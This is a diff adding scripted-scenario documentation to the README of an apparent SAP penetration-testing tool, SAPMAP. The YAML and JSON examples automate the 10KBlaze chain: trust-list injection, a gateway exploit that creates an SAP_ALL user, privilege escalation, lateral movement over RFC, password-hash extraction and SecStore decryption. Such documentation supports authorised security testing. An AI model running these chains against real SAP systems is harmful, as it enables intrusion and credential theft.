@@ -620,6 +620,206 @@ Discovers valid client numbers (000–999) by testing DIAG logon responses.
 
 ---
 
+## Scripted Scenarios
+
+SAPMAP supports automated attack scenarios via script files. The GUI opens normally and each step executes visually — you watch the attack unfold on the map in real-time.
+
+### Usage
+
+```bash
+python3 sapmap.py --script scripts/demo_10kblaze.yaml
+python3 sapmap.py --script scripts/demo_simple.json    # JSON (no PyYAML needed)
+```
+
+### Script Format (YAML)
+
+```yaml
+name: "My Attack Scenario"
+description: "Optional description shown in console"
+
+steps:
+  - action: add_system
+    sid: S4H
+    ip: 192.168.2.209
+    instance: "00"
+
+  - action: check_gw
+    target: S4H
+
+  - action: create_user
+    target: S4H
+    method: gw_exploit
+    client: "001"
+```
+
+### Script Format (JSON)
+
+```json
+{
+  "name": "My Attack Scenario",
+  "steps": [
+    {"action": "add_system", "sid": "S4H", "ip": "192.168.2.209", "instance": "00"},
+    {"action": "check_gw", "target": "S4H"},
+    {"action": "create_user", "target": "S4H", "method": "gw_exploit", "client": "001"}
+  ]
+}
+```
+
+### Available Actions
+
+#### System Management
+
+| Action | Parameters | Description |
+|--------|-----------|-------------|
+| `add_system` | `sid`, `ip`, `instance`, `saprouter` (optional) | Add a system to the map |
+| `set_credentials` | `target`, `username`, `password`, `client` | Store credentials for a system |
+| `sleep` | `seconds` | Pause between steps |
+
+#### Scanning & Detection
+
+| Action | Parameters | Description |
+|--------|-----------|-------------|
+| `check_gw` | `target` | Check if SAP Gateway is vulnerable to SAPXPG exploit |
+| `check_ms` | `target` | Check if MS internal port is unprotected (CVE-2020-6207) |
+| `deep_scan` | `target` | Run full SAPology vulnerability scan |
+| `check_all_gw` | *(none)* | Check GW vulnerability on all systems on the map |
+| `check_all_betrusted` | `attacker_ip` (`auto` = detect) | Check 10KBlaze on all systems on the map |
+
+#### Exploitation
+
+| Action | Parameters | Description |
+|--------|-----------|-------------|
+| `betrusted` | `target`, `attacker_ip` (`auto` = detect), `nilist_wait` (default: 30) | Inject attacker IP into GW trust list via MS betrusted |
+| `betrusted_chain` | `target`, `attacker_ip`, `nilist_wait`, `client` | Full 10KBlaze chain: betrusted → GW exploit → create user |
+| `create_user` | `target`, `method` (`gw_exploit` or `credentials`), `client` | Create a SAPMAP user with SAP_ALL |
+| `lpe` | `target`, `method` (optional — tries all if omitted) | Local privilege escalation (assign SAP_ALL to current user) |
+| `propagate` | `target` | Exploit RFC connections to reach other systems |
+
+#### Data Extraction
+
+| Action | Parameters | Description |
+|--------|-----------|-------------|
+| `retrieve_rfcs` | `target` | Retrieve all RFC destinations from the system |
+| `test_rfcs` | `target` | Test/ping all discovered RFC destinations |
+| `download_hashes` | `target` | Extract USR02 password hashes (BCODE/PASSCODE) |
+| `download_secstore` | `target` | Decrypt SecStore (RSECTAB) — RFC/DB/CTS/SMTP passwords |
+| `impact_assess` | `target`, `client` (optional), `scenario` (optional) | Run business impact assessment (all or one scenario) |
+
+#### Landscape Analysis
+
+| Action | Parameters | Description |
+|--------|-----------|-------------|
+| `analyze_chains` | *(none)* | Discover RFC trust chain escalation paths across the landscape |
+
+### Per-Step Options
+
+Every step supports these optional fields:
+
+| Option | Default | Description |
+|--------|---------|-------------|
+| `timeout` | 300 | Maximum seconds to wait for the step to complete |
+| `delay` | 1 | Seconds to pause after the step finishes |
+| `required` | false | If `true`, abort the entire script when this step fails |
+
+### Example: Full 10KBlaze Chain
+
+```yaml
+name: "10KBlaze Full Chain Demo"
+description: "Compromise SAP S4H via betrusted + GW exploit, then extract business data"
+
+steps:
+  - action: add_system
+    sid: S4H
+    ip: 192.168.2.209
+    instance: "00"
+
+  - action: check_gw
+    target: S4H
+
+  - action: check_ms
+    target: S4H
+
+  - action: betrusted
+    target: S4H
+    attacker_ip: auto
+
+  - action: create_user
+    target: S4H
+    method: gw_exploit
+    client: "001"
+
+  - action: retrieve_rfcs
+    target: S4H
+
+  - action: download_secstore
+    target: S4H
+
+  - action: impact_assess
+    target: S4H
+    client: "001"
+```
+
+### Example: Multi-System Landscape
+
+```yaml
+name: "SAP Landscape Attack"
+description: "Scan 3 systems, exploit, propagate, analyze trust chains"
+
+steps:
+  - action: add_system
+    sid: S4H
+    ip: 192.168.2.209
+    instance: "00"
+
+  - action: add_system
+    sid: TWT
+    ip: 192.168.2.60
+    instance: "00"
+
+  - action: add_system
+    sid: ORA
+    ip: 192.168.2.16
+    instance: "00"
+
+  - action: check_all_gw
+
+  - action: check_all_betrusted
+    attacker_ip: auto
+
+  - action: create_user
+    target: S4H
+    method: gw_exploit
+    client: "001"
+
+  - action: retrieve_rfcs
+    target: S4H
+
+  - action: impact_assess
+    target: S4H
+    client: "001"
+
+  - action: analyze_chains
+```
+
+### Console Output
+
+The script logs progress to the SAPMAP console:
+
+```
+[SCRIPT] === 10KBlaze Full Chain Demo ===
+[SCRIPT] Compromise SAP S4H via betrusted + GW exploit, then extract business data
+[SCRIPT] 8 steps to execute
+
+[SCRIPT] Step 1/8: add_system on S4H
+[SCRIPT] Step 1/8: completed
+[SCRIPT] Step 2/8: check_gw on S4H
+[SCRIPT] Step 2/8: completed
+...
+[SCRIPT] === All 8 steps completed ===
+```
+
+---
+
 ## State Management
 
 ### Saving & Loading
